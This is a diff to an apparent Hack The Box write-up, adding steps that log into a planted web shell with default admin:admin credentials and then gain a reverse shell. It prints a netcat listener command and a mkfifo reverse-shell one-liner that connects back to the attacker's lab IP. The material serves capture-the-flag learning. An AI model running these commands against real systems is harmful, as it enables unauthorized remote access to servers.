@@ -93,9 +93,40 @@ Generally the first thing to do when having found a login portal is to try defau
 
 ![default smevk login creds ](.gitbook/assets/vmplayer_0mwwpxanel.png)
 
-And so using admin admin to log into the web shell we are then greeted with a rather complicated looking webshell to server interface.
+And so using admin:admin to log into the web shell we are then greeted with a rather complicated looking webshell to server interface.
 
 ![](.gitbook/assets/vmplayer_1bt8dlamvv.png)
 
 Now upon closer inspection this page tells us a LOT about the sever. For example it tells us that we are currently interacting with the server as webadmin. What software the server is running \(Apache 2.4.29\) as well as what software is installed and accessible by us. Those being php, perl, tar, gzip, bzip2, nc, and wget. 
+
+From here there are several ways to gain shell access. But I went for a relatively simple reverse bash shell. To do this I started a netcat listener on my kali using the command:
+
+```text
+nc -lvnp 4445
+```
+
+| Command | Explanation |
+| :--- | :--- |
+| nc | runs the netcat tool |
+| -l | listen mode, for inbound connections |
+| -v | verbose, this means that it will display more information about incoming connections |
+| -n | numeric-only IP addresses can connect, no DNS |
+| -p | local port number to listen on |
+| 4445 | the port number to listen on |
+
+To connect to our netcat listener on our machine we create and execute the following payload through the payload interface
+
+```text
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 4445 > /tmp/f
+```
+
+You can find the same code used here and many more useful short code snippets for gaining reverse shell here: [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+All that needs changing in the ip address and port to match our own on the HTB network and the port set in the netcat port above.
+
+![](.gitbook/assets/vmplayer_u8a5nuwhhg.png)
+
+And we are in. We are webadmin on the server. From here we need to escalate our privileges until we become root.
+
+
 
